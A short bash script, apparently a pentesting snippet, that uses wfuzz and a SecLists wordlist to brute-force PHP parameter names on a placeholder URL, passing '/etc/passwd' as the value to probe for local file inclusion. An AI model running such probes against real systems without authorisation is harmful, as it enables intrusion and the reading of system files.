#!/bin/bash
#Require wfuzz
#Brute force in php file parameters
# use --hl= to hidde lines
 
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://url/index.php?FUZZ=/etc/passwd" -t 20    